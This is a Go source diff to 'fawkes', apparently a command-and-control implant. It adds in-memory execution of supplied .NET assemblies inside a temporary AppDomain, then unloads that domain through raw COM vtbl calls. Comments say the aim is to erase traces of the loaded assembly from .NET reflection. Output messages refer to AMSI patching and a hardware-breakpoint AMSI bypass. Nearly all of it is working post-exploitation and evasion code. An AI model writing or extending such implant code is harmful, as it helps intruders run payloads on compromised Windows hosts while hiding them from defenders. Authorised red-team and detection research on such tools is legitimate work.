@@ -7,7 +7,9 @@ import (
 	"encoding/base64"
 	"fmt"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
@@ -120,26 +122,176 @@ func executeAssemblyAction(assemblyB64, arguments string) structs.CommandResult 
 	}
 
 	output.WriteString(fmt.Sprintf("\n[*] Executing assembly (%d bytes, %d args)...\n", len(assemblyBytes), len(args)))
-	output.WriteString(strings.Repeat("-", 60) + "\n")
 
-	// Step 5: Execute the assembly
-	assemblyOutput, execErr := ExecuteNETAssembly(assemblyBytes, args)
+	// Step 5: Execute with AppDomain isolation
+	// Create a temporary AppDomain to prevent assembly metadata leakage.
+	// After execution, unloading the domain removes all traces of the loaded assembly
+	// from .NET reflection enumeration.
+	assemblyOutput, isolated, execErr := executeInIsolatedDomain(assemblyBytes, args, &output)
 	if execErr != nil {
-		output.WriteString(fmt.Sprintf("\n[!] Execution error: %v\n", execErr))
-		if strings.Contains(execErr.Error(), "0x8007000b") {
-			output.WriteString("[!] AMSI may have blocked this assembly despite patching.\n")
-			output.WriteString("[!] Try: start-clr -amsi_patch 'Hardware Breakpoint' then inline-assembly.\n")
+		// Fallback: if AppDomain isolation failed, use the default domain
+		if !isolated {
+			output.WriteString("[*] Falling back to default AppDomain...\n")
+			output.WriteString(strings.Repeat("-", 60) + "\n")
+			var fallbackOutput string
+			fallbackOutput, execErr = ExecuteNETAssembly(assemblyBytes, args)
+			if execErr != nil {
+				output.WriteString(fmt.Sprintf("\n[!] Execution error: %v\n", execErr))
+				if strings.Contains(execErr.Error(), "0x8007000b") {
+					output.WriteString("[!] AMSI may have blocked this assembly despite patching.\n")
+					output.WriteString("[!] Try: start-clr -amsi_patch 'Hardware Breakpoint' then inline-assembly.\n")
+				}
+				return errorResult(output.String())
+			}
+			assemblyOutput = fallbackOutput
+		} else {
+			output.WriteString(fmt.Sprintf("\n[!] Execution error: %v\n", execErr))
+			return errorResult(output.String())
 		}
-		return errorResult(output.String())
 	}
 
 	if assemblyOutput != "" {
 		output.WriteString(assemblyOutput)
 	}
 	output.WriteString("\n" + strings.Repeat("-", 60) + "\n")
-	output.WriteString("[+] Assembly execution complete")
+	if isolated {
+		output.WriteString("[+] Assembly execution complete (isolated AppDomain — unloaded)")
+	} else {
+		output.WriteString("[+] Assembly execution complete (default AppDomain)")
+	}
 
 	return successResult(output.String())
+}
+
+// executeInIsolatedDomain creates a temporary AppDomain, loads and executes the assembly,
+// then unloads the domain. Returns (output, wasIsolated, error).
+// If AppDomain creation fails, wasIsolated=false and the caller should fall back.
+func executeInIsolatedDomain(assemblyBytes []byte, args []string, log *strings.Builder) (string, bool, error) {
+	assemblyMutex.Lock()
+	if runtimeHost == nil {
+		assemblyMutex.Unlock()
+		return "", false, fmt.Errorf("CLR runtime host not initialized")
+	}
+
+	// Create isolated AppDomain
+	domainName := fmt.Sprintf("FawkesIsolated_%d", time.Now().UnixNano())
+	namePtr, err := syscall.UTF16PtrFromString(domainName)
+	if err != nil {
+		assemblyMutex.Unlock()
+		return "", false, fmt.Errorf("domain name conversion: %v", err)
+	}
+
+	isolatedDomain, createErr := runtimeHost.CreateDomain(namePtr)
+	if createErr != nil {
+		assemblyMutex.Unlock()
+		log.WriteString(fmt.Sprintf("[-] AppDomain creation failed: %v\n", createErr))
+		return "", false, nil // not isolated, caller should fall back
+	}
+	log.WriteString(fmt.Sprintf("[+] Isolated AppDomain created: %s\n", domainName))
+	assemblyMutex.Unlock()
+
+	// Load assembly into isolated domain
+	assemblyMutex.Lock()
+	safeArrayPtr, err := clr.CreateSafeArray(assemblyBytes)
+	if err != nil {
+		assemblyMutex.Unlock()
+		return "", true, fmt.Errorf("SafeArray creation failed: %v", err)
+	}
+
+	assembly, loadErr := isolatedDomain.Load_3(safeArrayPtr)
+	if loadErr != nil {
+		assemblyMutex.Unlock()
+		errMsg := fmt.Sprintf("Assembly load failed in isolated domain: %v", loadErr)
+		if strings.Contains(loadErr.Error(), "0x8007000b") {
+			errMsg += " (AMSI may have blocked this assembly)"
+		}
+		// Try to unload even on failure
+		unloadAppDomain(runtimeHost, isolatedDomain, log)
+		return "", true, fmt.Errorf("%s", errMsg)
+	}
+
+	// Get entry point
+	methodInfo, epErr := assembly.GetEntryPoint()
+	if epErr != nil {
+		assemblyMutex.Unlock()
+		unloadAppDomain(runtimeHost, isolatedDomain, log)
+		return "", true, fmt.Errorf("entry point not found: %v", epErr)
+	}
+	assemblyMutex.Unlock()
+
+	// Invoke assembly
+	assemblyMutex.Lock()
+	log.WriteString(strings.Repeat("-", 60) + "\n")
+	var stdout, stderr string
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				stderr = fmt.Sprintf("PANIC during assembly execution: %v", r)
+			}
+		}()
+		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
+	}()
+	assemblyMutex.Unlock()
+
+	// Build output
+	var result strings.Builder
+	if stdout != "" {
+		result.WriteString(stdout)
+	}
+	if stderr != "" {
+		if result.Len() > 0 {
+			result.WriteString("\n")
+		}
+		result.WriteString("[STDERR] " + stderr)
+	}
+
+	// Unload the isolated domain to clean up assembly metadata
+	unloadAppDomain(runtimeHost, isolatedDomain, log)
+
+	return result.String(), true, nil
+}
+
+// unloadAppDomain calls ICORRuntimeHost::UnloadDomain to unload an AppDomain.
+// The go-clr library has the vtbl entry but no Go wrapper, so we call it via vtbl.
+// ICORRuntimeHost vtbl layout (COM interface):
+//
+//	[0] QueryInterface [1] AddRef [2] Release
+//	[3] CreateLogicalThreadState [4] DeleteLogicalThreadState
+//	[5] SwitchInLogicalThreadState [6] SwitchOutLogicalThreadState
+//	[7] LocksHeldByLogicalThread [8] MapFile [9] GetConfiguration
+//	[10] Start [11] Stop [12] CreateDomain [13] GetDefaultDomain
+//	[14] EnumDomains [15] NextDomain [16] CloseEnum
+//	[17] CreateDomainEx [18] CreateDomainSetup [19] CreateEvidence
+//	[20] UnloadDomain [21] CurrentDomain
+const unloadDomainVtblIndex = 20
+
+func unloadAppDomain(host *clr.ICORRuntimeHost, domain *clr.AppDomain, log *strings.Builder) {
+	if host == nil || domain == nil {
+		return
+	}
+
+	assemblyMutex.Lock()
+	defer assemblyMutex.Unlock()
+
+	// ICORRuntimeHost struct has vtbl pointer at offset 0.
+	// vtbl is an array of function pointers.
+	vtblPtr := *(*uintptr)(unsafe.Pointer(host))
+	//nolint:govet // COM vtbl pointer arithmetic is inherently unsafe
+	unloadFn := *(*uintptr)(unsafe.Pointer(vtblPtr + uintptr(unloadDomainVtblIndex)*unsafe.Sizeof(uintptr(0))))
+
+	hr, _, _ := syscall.Syscall(
+		unloadFn,
+		2,
+		uintptr(unsafe.Pointer(host)),
+		uintptr(unsafe.Pointer(domain)),
+		0,
+	)
+
+	if hr == 0 { // S_OK
+		log.WriteString("[+] Isolated AppDomain unloaded — assembly metadata cleaned\n")
+	} else {
+		log.WriteString(fmt.Sprintf("[-] AppDomain unload returned HRESULT 0x%X (non-fatal)\n", uint32(hr)))
+	}
 }
 
 // parseAssemblyArgs splits a space-separated argument string, respecting quoted strings.
